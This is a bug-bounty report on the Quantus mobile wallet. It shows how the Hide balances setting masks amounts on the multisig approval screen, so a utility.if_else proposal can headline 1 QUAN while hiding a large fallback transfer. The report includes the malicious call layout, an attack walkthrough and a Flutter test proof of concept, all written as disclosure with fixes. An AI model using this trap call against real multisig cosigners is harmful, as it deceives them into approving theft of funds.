# 88914 w a high hide balances masks executable multisig amounts enabling deceptive utility if else approvals

**Submitted on Aug 15th 2026 at 15:55:18 UTC by @zkbm for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88914
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

## Brief/Intro

The mobile application's privacy setting for hiding account balances is also applied to amounts inside the decoded runtime call shown on a multisig authorization screen. Native-token `AmountField` values are `-----`, but the Approve button remains enabled.

Composite calls make this exploitable rather than merely inconvenient. For `utility.if_else`, the confirmation headline is derived only from the primary branch. A malicious cosigner can therefore propose a call whose primary branch appears to transfer 1 QUAN but is guaranteed to fail, while its fallback transfers a much larger amount to the same expected recipient. The screen headlines the proposal as 1 QUAN, masks the fallback amount, and permits the victim to approve it. Once the approval threshold is reached, the attacker can execute the proposal and the fallback transfer runs. The PoC proves that fallback transfers of 2 QUAN and 999,999.999999999999 QUAN have different SCALE-encoded call bytes but produce identical authorization text.

I think this could reasonably be scored as a High or Critical - since it does involve some level of user interaction, but to me this is a transaction authorization integrity flaw, not just a cosmetic UX issue. You can present materially different signed payloads with identical authorization text that conceals the amount that can execute and leaves approval enabled. Considering the ByBit hack root cause (manipulation of safe signing), I think it could be considered critical but didn't want to oversell the rating. Hide balances is a global, persistent privacy setting, so it's reasonable that a user would have this enabled while viewing another account and later enter an authorization flow with the fallback amounts concealed.

## Vulnerability Details

`mobile-app/lib/v2/components/decoded_call_view.dart` renders a native-token `AmountField` through the general transaction display provider and retains only its `primaryAmount`:

```dart
final value = assetId == null
    ? ref.watch(txAmountDisplayProvider)(token, isSend: true).primaryAmount
    : '$token (asset #$assetId, raw units)';
```

`mobile-app/lib/providers/currency_display_provider.dart` makes that provider dependent on the global `isBalanceHiddenProvider`. When the privacy option is active, all amounts collapse to the same `-----` string. The same provider also defaults to two token decimals and may select rounded fiat as the primary display, making it unsuitable for authorization even when privacy mode is off.

`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart` displays the decoded call but only blocks approval while call bytes are loading or unavailable. It does not block approval when signed fields are redacted:

```dart
final blocked = _submitting || _loadingCallBytes || _callBytesFailed;
```

Finally, `quantus_sdk/lib/src/chain/call_decoder.dart` assigns `utility.if_else` the summary of its primary branch:

```dart
summary: describe(main).summary,
```

This combination creates a misleading 1 QUAN headline while the amount in the branch that will actually execute is hidden.

## Attack scenario

{% stepper %}
{% step %}

## Establish the multisig boundary

The victim and attacker are members of a 2-of-2 multisig. This is the security boundary multisig is intended to enforce. One malicious signer must not be able to move funds without the honest signer's informed authorization.
{% endstep %}

{% step %}

## Enable Hide balances

The victim enables the wallet's **Hide balances** privacy option.
{% endstep %}

{% step %}

## Propose the malicious inner call

The attacker proposes the following inner call, using the documented Quantus CLI or any SCALE-capable client:

```
utility.if_else(
  main = utility.dispatch_as_fallible(
    as_origin = Signed(...),
    call = balances.transfer_allow_death(expected_recipient, 1 QUAN)
  ),
  fallback = balances.transfer_allow_death(expected_recipient, 999999.999999999999 QUAN)
)
```

{% endstep %}

{% step %}

## Trigger the fallback

`dispatch_as_fallible` requires a Root origin. Multisig execution supplies the multisig's signed origin, so the primary branch fails with `BadOrigin` and `utility.if_else` dispatches the fallback.
{% endstep %}

{% step %}

## Approve the misleading proposal

The victim opens the proposal in the mobile app. The headline says **1 QUAN**. Both nested amount rows say `-----`; after scrolling, the fallback amount is still `-----` and **Approve** is enabled.
{% endstep %}

{% step %}

## Execute the approved proposal

The victim approves what appears to be the expected 1 QUAN payment. The attacker executes the now-approved proposal. The fallback sends the larger amount, limited only by the multisig's available balance.
{% endstep %}
{% endstepper %}

## Impact

An attacker who controls one multisig member can obtain another member's approval for materially different transfer arguments than the authorization UI communicates. Once the threshold is reached, this results in direct theft of the multisig's funds.

This maps to the in-scope Critical impacts **Direct theft of user funds** and **Malicious interactions with an already-connected wallet, including modifying transaction arguments or parameters**.

## Recommended fix

{% stepper %}
{% step %}

## Render exact native-token amounts

Render every native-token `AmountField` in canonical token units at full chain precision, regardless of Hide balances, fiat-first mode, or account-balance visibility.
{% endstep %}

{% step %}

## Use an authorization-specific formatter

Never use `txAmountDisplayProvider` in a decoded-call authorization view. Use an authorization-specific formatter that cannot redact or round signed values.
{% endstep %}

{% step %}

## Block incomplete confirmations

Disable confirmation if any security-sensitive field cannot be rendered exactly.
{% endstep %}

{% step %}

## Clarify conditional calls

For conditional calls, make it explicit that either branch may execute and avoid using only the primary branch as the transaction headline.
{% endstep %}

{% step %}

## Add injectivity testing

Add an injectivity test so that changing any amount, destination, branch, or nested call must change the authorization text.
{% endstep %}
{% endstepper %}

## Proof of Concept

Save the following as `hidden_multisig_amount_poc_test.dart` in the test directory (`mobile-app/test/unit/hidden_multisig_amount_poc_test.dart`). Run it from the `mobile-app` directory after your Flutter setup is done.

```
flutter test test/unit/hidden_multisig_amount_poc_test.dart
```

```dart
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/generated/planck/pallets/balances.dart' as balances_pallet;
import 'package:quantus_sdk/generated/planck/pallets/utility.dart' as utility_pallet;
import 'package:quantus_sdk/generated/planck/types/frame_support/dispatch/raw_origin.dart' as raw_origin;
import 'package:quantus_sdk/generated/planck/types/quantus_runtime/origin_caller.dart' as origin_caller;
import 'package:quantus_sdk/generated/planck/types/sp_runtime/multiaddress/multi_address.dart' as multi_address;
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:resonance_network_wallet/providers/currency_display_provider.dart';
import 'package:resonance_network_wallet/providers/wallet_providers.dart';
import 'package:resonance_network_wallet/services/exchange_rate_service.dart';
import 'package:resonance_network_wallet/v2/screens/multisig/multisig_action_confirm_sheet.dart';

import '../extensions.dart';
import '../fakes.dart';

class _HiddenBalanceSettingsService extends FakeSettingsService {
  @override
  bool isBalanceHidden() => true;

  @override
  String? getString(String key) => null;
}

final _recipient = multi_address.MultiAddress.values.id(Uint8List.fromList(List<int>.filled(32, 0xA7)));

RuntimeCall _batchTransfer(BigInt amount) {
  final transfer = const balances_pallet.Txs().transferAllowDeath(dest: _recipient, value: amount);
  return const utility_pallet.Txs().batchAll(calls: [transfer]);
}

RuntimeCall _ifElseTrap({required BigInt visibleAmount, required BigInt fallbackAmount}) {
  final visibleTransfer = const balances_pallet.Txs().transferAllowDeath(dest: _recipient, value: visibleAmount);
  final rootOnlyWrapper = const utility_pallet.Txs().dispatchAsFallible(
    asOrigin: origin_caller.OriginCaller.values.system(
      raw_origin.RawOrigin.values.signed(Uint8List.fromList(List<int>.filled(32, 0xB4))),
    ),
    call: visibleTransfer,
  );
  final fallbackTransfer = const balances_pallet.Txs().transferAllowDeath(dest: _recipient, value: fallbackAmount);
  return const utility_pallet.Txs().ifElse(main: rootOnlyWrapper, fallback: fallbackTransfer);
}

MultisigProposal _proposalFor(RuntimeCall call, MultisigAccount multisig) {
  final timestamp = DateTime.utc(2026, 8, 14);
  final decoded = CallDecoder.decodeBytes(call.encode());
  return MultisigProposal(
    entityId: 'proposal-7',
    id: 7,
    multisigAddress: multisig.accountId,
    proposer: multisig.signers.first,
    createdAt: timestamp,
    updatedAt: timestamp,
    pallet: decoded.pallet,
    call: decoded.call,
    recipient: '',
    amount: BigInt.zero,
    callRaw: Uint8List.fromList(call.encode()),
    expiryBlock: 1000,
    approvals: const [],
    deposit: BigInt.zero,
    status: MultisigProposalStatus.active,
    threshold: multisig.threshold,
    signerCount: multisig.signers.length,
  );
}

MultisigConfirmSheetLabels get _labels => MultisigConfirmSheetLabels(
  title: (_) => 'Approve proposal',
  body: (_) => 'Review the call before approving it.',
  confirmLabel: (_) => 'Approve',
  dismissLabel: (_) => 'Cancel',
  authReason: (_) => 'Authenticate to approve',
  failedMessage: (_) => 'Approval failed',
);

Future<void> _pumpConfirmation(
  WidgetTester tester, {
  required RuntimeCall call,
  required Account signer,
  required MultisigAccount multisig,
}) async {
  await tester.pumpApp(
    Scaffold(
      body: MultisigActionConfirmSheet(
        msig: multisig,
        proposal: _proposalFor(call, multisig),
        signer: signer,
        labels: _labels,
        estimateFee: (_, _, _) async => BigInt.zero,
        submit: (_, _, _, _) async {},
        buildCall: (_, _) => call,
        submitExternal:
            (_, {required signer, required unsignedData, required signature, required publicKey, fee}) async {
              return '0xdeadbeef';
            },
        logPrefix: '[HiddenAmountPoC]',
        hardwareTelemetryPrefix: 'hidden_amount_poc',
        hardwareCacheIdentity: 'hidden-amount-poc',
      ),
    ),
    overrides: [
      settingsServiceProvider.overrideWithValue(_HiddenBalanceSettingsService()),
      exchangeRateServiceProvider.overrideWithValue(ExchangeRateService(rates: ExchangeRateService.fallbackRates)),
    ],
  );
  await tester.pump();
}

void _expectApprovalEnabled(WidgetTester tester) {
  final approveInkWell = find.ancestor(of: find.text('Approve'), matching: find.byType(InkWell));
  expect(approveInkWell, findsOneWidget);
  expect(
    tester.widget<InkWell>(approveInkWell).onTap,
    isNotNull,
    reason: 'The app permits approval even though a security-sensitive field is hidden.',
  );
}

List<String> _renderedText(WidgetTester tester) =>
    tester.widgetList<Text>(find.byType(Text)).map((widget) => widget.data).whereType<String>().toList(growable: false);

void main() {
  setUpAll(() async {
    TestWidgetsFlutterBinding.ensureInitialized();
    await (FontLoader('Geist')..addFont(rootBundle.load('assets/fonts/Geist-Regular.ttf'))).load();
    await (FontLoader('Geist Mono')..addFont(rootBundle.load('assets/fonts/GeistMono-Regular.ttf'))).load();
  });

  testWidgets('hidden-balance mode omits a nested signed amount while leaving approval enabled', (tester) async {
    final signer = makeAccount(1);
    final multisig = MultisigAccount(
      name: 'Treasury',
      accountId: 'qzmultisig${'m' * 38}',
      signers: [signer.accountId, makeAccount(2).accountId],
      threshold: 2,
      nonce: BigInt.zero,
      myMemberAccountId: signer.accountId,
    );
    final call = _batchTransfer(BigInt.parse('999999999999999999'));

    await _pumpConfirmation(tester, call: call, signer: signer, multisig: multisig);

    expect(find.text('-----'), findsOneWidget, reason: 'The signed transfer amount is replaced by the privacy mask.');
    expect(
      _renderedText(tester).join('\n'),
      isNot(contains('999,999.99 QUAN')),
      reason: 'The formatted signed amount does not appear in the authorization text.',
    );

    _expectApprovalEnabled(tester);
  });

  testWidgets('if_else headline shows a benign amount while the executable fallback amount is hidden', (tester) async {
    final signer = makeAccount(1);
    final multisig = MultisigAccount(
      name: 'Treasury',
      accountId: 'qzmultisig${'m' * 38}',
      signers: [signer.accountId, makeAccount(2).accountId],
      threshold: 2,
      nonce: BigInt.zero,
      myMemberAccountId: signer.accountId,
    );
    final call = _ifElseTrap(
      visibleAmount: BigInt.parse('1000000000000'),
      fallbackAmount: BigInt.parse('999999999999999999'),
    );

    await _pumpConfirmation(tester, call: call, signer: signer, multisig: multisig);

    expect(find.text('1 QUAN'), findsOneWidget, reason: 'The headline is derived only from the primary branch.');
    expect(find.text('-----'), findsNWidgets(2), reason: 'Both nested transfer amounts are hidden in the call tree.');
    expect(
      _renderedText(tester).join('\n'),
      isNot(contains('999,999.99 QUAN')),
      reason: 'The executable fallback amount has no visible numeric representation.',
    );
    _expectApprovalEnabled(tester);
    await tester.drag(find.byType(SingleChildScrollView).first, const Offset(0, -450));
    await tester.pumpAndSettle();
    expect(find.text('Fallback call'), findsOneWidget, reason: 'The fallback branch remains present after scrolling.');
    expect(
      find.text('-----'),
      findsNWidgets(2),
      reason: 'Scrolling to the fallback does not reveal either signed amount.',
    );
    _expectApprovalEnabled(tester);
  });

  testWidgets('different signed fallback amounts produce identical authorization text', (tester) async {
    final signer = makeAccount(1);
    final multisig = MultisigAccount(
      name: 'Treasury',
      accountId: 'qzmultisig${'m' * 38}',
      signers: [signer.accountId, makeAccount(2).accountId],
      threshold: 2,
      nonce: BigInt.zero,
      myMemberAccountId: signer.accountId,
    );
    final smallFallback = _ifElseTrap(
      visibleAmount: BigInt.parse('1000000000000'),
      fallbackAmount: BigInt.parse('2000000000000'),
    );
    final largeFallback = _ifElseTrap(
      visibleAmount: BigInt.parse('1000000000000'),
      fallbackAmount: BigInt.parse('999999999999999999'),
    );

    expect(smallFallback.encode(), isNot(orderedEquals(largeFallback.encode())));

    await _pumpConfirmation(tester, call: smallFallback, signer: signer, multisig: multisig);
    final smallFallbackText = _renderedText(tester);

    await _pumpConfirmation(tester, call: largeFallback, signer: signer, multisig: multisig);
    final largeFallbackText = _renderedText(tester);

    expect(
      largeFallbackText,
      orderedEquals(smallFallbackText),
      reason: 'The user sees identical authorization text even though the signed fallback amount changed.',
    );
  });
}
```

Expected result:

```
hidden-balance mode omits a nested signed amount while leaving approval enabled
if_else headline shows a benign amount while the executable fallback amount is hidden
different signed fallback amounts produce identical authorization text
All tests passed!
```

The test constructs and SCALE-encodes real `batch_all` and `if_else` runtime calls using the generated runtime types. It decodes those bytes with the production `CallDecoder` and renders the production `MultisigActionConfirmSheet`.

The test demonstrates the following:

* The signed 999,999.999999999999 QUAN amount is replaced by -----.
* Both amounts in the conditional call are hidden.
* The Approve control has a non-null tap handler.
* The authorization headline says 1 QUAN based only on the primary branch.
* Scrolling to the fallback does not reveal its amount.
* Changing the fallback from 2 QUAN to 999,999.999999999999 QUAN changes the signed SCALE bytes but produces identical rendered authorization text.

Attached is a screenshot from the victim's point of view. As you can see, this is extremely deceptive since the victim reasonably believes that they are authorizing the transfer of 1 QUAN. The executable fallback amount can't be verified by the victim.
